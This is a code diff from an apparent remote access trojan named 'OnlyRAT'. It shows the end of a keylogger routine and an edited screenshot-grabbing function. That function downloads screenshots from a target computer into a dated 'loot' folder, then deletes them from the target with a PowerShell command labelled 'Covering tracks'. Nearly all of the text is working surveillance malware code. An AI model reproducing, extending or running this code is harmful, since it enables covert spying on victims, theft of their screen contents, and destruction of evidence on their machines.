@@ -165,23 +165,29 @@ def keylogger(address, password, username, working):
     # execute logger
     print("\n[!] Restart target computer to execute")
 
-# takes screenshot
+# takes screenshots off of target
 def grab_screenshots(address, password, working, username):
     # download screenshot
-    print("[*] Downloading screenshots...")
+    print("\n[*] Downloading screenshots...")
     screenshot_location = f"{working}/amETlOMhPo"
     remote_download(address, password, screenshot_location)
-    print("[+] Screenshot downloaded")
+    print("[+] Screenshots downloaded")
 
+    # formatting screenshots
+    print("[*] Fromatting screenshots...")
     loot_folder = f"screenshots-{username}-{current_date()}"
-
     os.system(f"mkdir ~/Downloads/{loot_folder}")
     os.system(f"mv ~/Downloads/amETlOMhPo/* ~/Downloads/{loot_folder}")
     os.system(f"rm -rf ~/Downloads/amETlOMhPo")
+    print("[+] Screenshots formatted")
 
+    # deletes screenshots off of target
+    print("[*] Covering tracks...")
     delete_screenshots = f"powershell Remove-Item {working}/amETlOMhPo/*"
     remote_command(address, password, delete_screenshots)
+    print("[+] Screenshot downloaded")
 
+    # confirmation
     print("\n[+] Screenshot downloaded to \"~/Downloads\"\n")
 
 # update OnlyRAT
